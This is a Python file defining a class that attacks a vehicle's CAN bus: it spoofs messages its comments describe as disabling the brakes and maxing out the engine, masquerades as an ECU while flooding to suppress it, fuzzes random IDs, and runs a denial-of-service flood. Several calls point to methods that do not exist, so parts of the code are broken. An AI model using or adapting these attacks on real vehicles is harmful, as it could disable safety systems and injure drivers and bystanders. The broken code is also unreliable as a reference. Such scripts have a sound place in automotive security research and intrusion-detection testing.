import can
import time
import random


class CanAttack:
    
    def __init__(self, interface = 'socketcan', channel = 'can0'):
        # Configurações do barramento CAN
        self.interface = interface
        self.channel = channel
        self.bus = can.interface.Bus(channel=channel, bustype=interface)

 

    # Função para enviar mensagens críticas spoofadas
    def send_spoofed_attack(self):
       # ID de mensagens críticas que serão spoofadas
        critical_message_ids = {
            0x3D4: [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],  # Exemplo: ID 0x3D4 desativa freios
            0x141: [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]   # Exemplo: ID 0x141 acelera motor ao máximo
        }
        
        for message_id, data in critical_message_ids.items():
            msg = can.Message(arbitration_id=message_id, data=data, is_extended_id=False, is_rx=False)
            try:
                self.bus.send(msg)
                print(f"Spoofed message sent: ID={hex(message_id)}, data={data}")
            except can.CanOperationError as e:
                print(f"Failed to send spoofed message: {e}")
                time.sleep(0.1)  # Pequeno atraso antes de tentar enviar novamente

        # Envia mensagens aleatórias para o barramento CAN, incluindo spoofing em intervalos regulares
        try:
            while True:
                try:
                    # Envia mensagens aleatórias
                    message_id = random.randint(0, 0x7FF)
                    message_data = [random.randint(0, 255) for _ in range(8)]
                    
                    
                    msg = can.Message(arbitration_id=message_id, data=message_data, is_extended_id=False, is_rx=False)
                    
                    self.bus.send(msg)
                    print(f"Random message sent: ID={hex(message_id)}, data={message_data}")

                    # A cada segundo, envia mensagens spoofadas
                    if int(time.time()) % 1 == 0:
                        self.send_spoofed_message()

                    time.sleep(0.0005)  # 0.5 milissegundos

                except can.CanOperationError as e:
                    print(f"Failed to send random message: {e}")
                    time.sleep(0.1)  # Pequeno atraso antes de tentar enviar novamente

        except KeyboardInterrupt:
            print("Script interrompido pelo usuário")

        finally:
            # self.bus.shutdown()
            print("Bus CAN desligado corretamente")


    # Função para enviar mensagens de masquerade
    def send_masquerade_attack(self):
        
        # ID da mensagem que queremos mascarar
        target_message_id = 0x123
        
        # Dados específicos ou aleatórios para a mensagem de masquerade
        masquerade_message_data = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x00, 0x11]  # Exemplo de dados específicos

        msg = can.Message(arbitration_id=target_message_id, data=masquerade_message_data, is_extended_id=False)
        self.bus.send(msg)
        print(f"Masquerade message sent: ID={hex(target_message_id)}, data={masquerade_message_data}")

        # Função para suprimir a ECU real
        def send_suppress_message():
            suppress_message_data = [0xFF for _ in range(8)]  # Dados padrão de supressão
            msg = can.Message(arbitration_id=target_message_id, data=suppress_message_data, is_extended_id=False)
            self.bus.send(msg)

        # Envia mensagens de masquerade e suprime a ECU real
        try:
            while True:
                # Envia a mensagem de masquerade
                self.send_masquerade_message()

                # Suprime a ECU real enviando mensagens com alta frequência
                for _ in range(10):
                    send_suppress_message()
                    time.sleep(0.0001)  # 0.1 milissegundos entre as mensagens de supressão

                time.sleep(0.01)  # 10 milissegundos entre as mensagens de masquerade

        except KeyboardInterrupt:
            pass

        # self.bus.shutdown()

    
    def send_fuzzy_attack(self):
        max_message_id = 0x7FF
        # Envia mensagens com dados aleatórios para o barramento CAN
        try:
            while True:
                # Gera um ID de mensagem aleatório
                message_id = random.randint(0, max_message_id)

                # Gera dados aleatórios para a mensagem (8 bytes)
                message_data = [random.randint(0, 255) for _ in range(8)]

                msg = can.Message(arbitration_id=message_id, data=message_data, is_extended_id=False)

                self.bus.send(msg)

                time.sleep(0.0005)  # 0.5 milissegundos

        except KeyboardInterrupt:
            pass

        # self.bus.shutdown()


    def send_dos_attack(self):
        max_message_id = 0x000
        # Envia mensagens com dados aleatórios para o barramento CAN
        try:
            while True:
                # Gera um ID de mensagem aleatório
                message_id = random.randint(0, max_message_id)

                # Gera dados aleatórios para a mensagem (8 bytes)
                message_data = [random.randint(0, 255)*0 for _ in range(8)]

                msg = can.Message(arbitration_id=message_id, data=message_data, is_extended_id=False)

                self.bus.send(msg)

                time.sleep(0.0005)  # 0.5 milissegundos

        except KeyboardInterrupt:
            pass

        # self.bus.shutdown()
